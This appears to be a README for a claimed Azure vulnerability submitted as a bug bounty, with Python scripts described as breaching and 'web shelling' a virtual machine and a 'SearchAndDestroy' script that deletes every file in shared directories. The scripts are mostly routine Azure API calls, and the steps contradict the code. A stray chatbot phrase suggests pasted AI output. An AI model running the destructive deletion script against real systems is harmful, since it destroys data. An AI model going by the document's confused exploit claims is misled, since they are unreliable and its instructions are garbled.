# KCA
Bug hunt msrc 🤞 DB too.

Here are the steps to reproduce the vulnerability exploit using the scripts 

Steps to Reproduce

1. Set Up Azure Environment:

Log in to the Azure portal.

Ensure you have the necessary permissions to create virtual machines and manage resources within your Azure subscription.

Set up a resource group if you don’t have one already.



2. Prepare the Scripts:

Ensure you have the three Python scripts available:

PostCreationScript.py: For running additional scripts after VM creation.

KubeCloudV2Azure.py: For creating a virtual machine.

SearchAndDestroyAzure.py: For deleting files in shared directories.


Make sure the scripts are configured with the correct subscription ID, resource group name, and any other parameters required (e.g., VM name).



3. Run the Post-Creation Script:

Before creating the virtual machine, run noauth.py to set up any additional configurations or scripts that need to be executed after the VM is created:

python noauth.py



4. Create the Virtual Machine:

After running the creation script, run KubeCloudV2Azure.py to breach the virtual machine:

python KubeCloudV2Azure.py

Ensure the VM is web shelled successfully and note its public IP address for later access.



5. Access Shared Directories:

Log into the newly created virtual machine via SSH using the public IP and credentials specified in the script.

Ensure that the shared directories exist and contain files for deletion.



6. Execute the Search and Destroy Script:

From within the VM, run the SearchAndDestroyAzure.py script:

python SearchAndDestroyAzure.py

This script will traverse the specified shared directories and delete all files it encounters.



7. Verification:

Verify that the files have been deleted from the specified shared directories by checking their contents after running the search and destroy script.



8. Document Findings:

Take note of any error messages or unexpected behavior during script execution.

Document the steps taken and any files affected for reporting purposes.


Example Code for Each Script:

By following these steps and using the provided scripts in the correct order, you should be able to reproduce the scenario of creating a VM and deleting files in shared directories. If you need any further modifications or assistance, feel free to ask!


No auth.py
```python
import requests
import json

# Base URL for the Azure Virtual Machine Management API
base_url = "https://management.azure.com/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/providers/Microsoft.Compute/virtualMachines/{vm_name}?api-version=2021-07-01"

# Replace these variables with actual values
subscription_id = "your_subscription_id"
resource_group_name = "your_resource_group_name"
vm_name = "your_vm_name"

# Construct the URL
url = base_url.format(subscription_id=subscription_id, resource_group_name=resource_group_name, vm_name=vm_name)

# Define the body of the request
vm_payload = {
    "location": "eastus",  # Specify the location
    "properties": {
        "hardwareProfile": {
            "vmSize": "Standard_DS1_v2"  # Specify the VM size
        },
        "storageProfile": {
            "imageReference": {
                "publisher": "MicrosoftWindowsServer",
                "offer": "WindowsServer",
                "sku": "2019-Datacenter",
                "version": "latest"
            },
            "osDisk": {
                "createOption": "FromImage"
            }
        },
        "osProfile": {
            "computerName": vm_name,
            "adminUsername": "azureuser",
            "adminPassword": "Password123!"  # Use a strong password
        },
        "networkProfile": {
            "networkInterfaces": [
                {
                    "id": "/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/providers/Microsoft.Network/networkInterfaces/{nic_name}"  # Replace with your NIC ID
                }
            ]
        }
    }
}

# Attempt to create the virtual machine without authentication
response = requests.put(url, headers={"Content-Type": "application/json"}, data=json.dumps(vm_payload))

# Output the response status
if response.status_code in [200, 201]:
    print("Success: The virtual machine has been created.")
else:
    print(f"Failed: Received response code {response.status_code}.")
    print("Response:", response.text)
```

KubecloudV2Azure.py
```python
import os
from azure.identity import DefaultAzureCredential
from azure.mgmt.compute import ComputeManagementClient

# Azure subscription and resource details
SUBSCRIPTION_ID = "your_subscription_id"
RESOURCE_GROUP_NAME = "your_resource_group"
VM_NAME = "your_vm_name"
LOCATION = "your_location"

# Initialize Azure credentials and client
credential = DefaultAzureCredential()
compute_client = ComputeManagementClient(credential, SUBSCRIPTION_ID)

def create_virtual_machine():
    try:
        print(f"Creating virtual machine: {VM_NAME} in resource group: {RESOURCE_GROUP_NAME}...")
        vm_parameters = {
            "location": LOCATION,
            "os_profile": {
                "computer_name": VM_NAME,
                "admin_username": "your_admin_username",
                "admin_password": "your_admin_password",
            },
            "hardware_profile": {
                "vm_size": "Standard_DS1_v2"
            },
            "storage_profile": {
                "image_reference": {
                    "publisher": "Canonical",
                    "offer": "UbuntuServer",
                    "sku": "18.04-LTS",
                    "version": "latest"
                },
                "os_disk": {
                    "name": f"{VM_NAME}_os_disk",
                    "caching": "ReadWrite",
                    "create_option": "FromImage"
                }
            },
            "network_profile": {
                "network_interfaces": [{
                    "id": f"/subscriptions/{SUBSCRIPTION_ID}/resourceGroups/{RESOURCE_GROUP_NAME}/providers/Microsoft.Network/networkInterfaces/{VM_NAME}-nic"
                }]
            }
        }
        compute_client.virtual_machines.begin_create_or_update(RESOURCE_GROUP_NAME, VM_NAME, vm_parameters)
        print(f"Virtual machine {VM_NAME} created successfully.")

    except Exception as e:
        print(f"Error creating virtual machine: {e}")

if __name__ == "__main__":
    create_virtual_machine()
```

Search and Destroy Azure.py

```python
import os

SHARED_DIRECTORIES = [
    "/mnt/shared_directory_1",
    "/mnt/shared_directory_2"
]

def search_and_destroy_all_files():
    try:
        for shared_directory in SHARED_DIRECTORIES:
            print(f"Searching in shared directory: {shared_directory}...")
            for root, dirs, files in os.walk(shared_directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    print(f"Deleting file: {file_path}...")
                    os.remove(file_path)
                    print(f"Deleted: {file_path}")

                for dir in dirs:
                    dir_path = os.path.join(root, dir)
                    if not os.listdir(dir_path):
                        print(f"Deleting empty directory: {dir_path}...")
                        os.rmdir(dir_path)
                        print(f"Deleted: {dir_path}")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    search_and_destroy_all_files()
```

Post creation script.py

```python
import subprocess

# List of scripts to run after VM creation
SCRIPTS_TO_RUN = [
    "another_script.py",  # Add your script names here
]

def run_additional_scripts():
    for script in SCRIPTS_TO_RUN:
        try:
            print(f"Running script: {script}...")
            subprocess.run(["python", script], check=True)
            print(f"Script {script} completed successfully.")
        except Exception as e:
            print(f"Error running script {script}: {e}")

if __name__ == "__main__":
    run_additional_scripts()
```

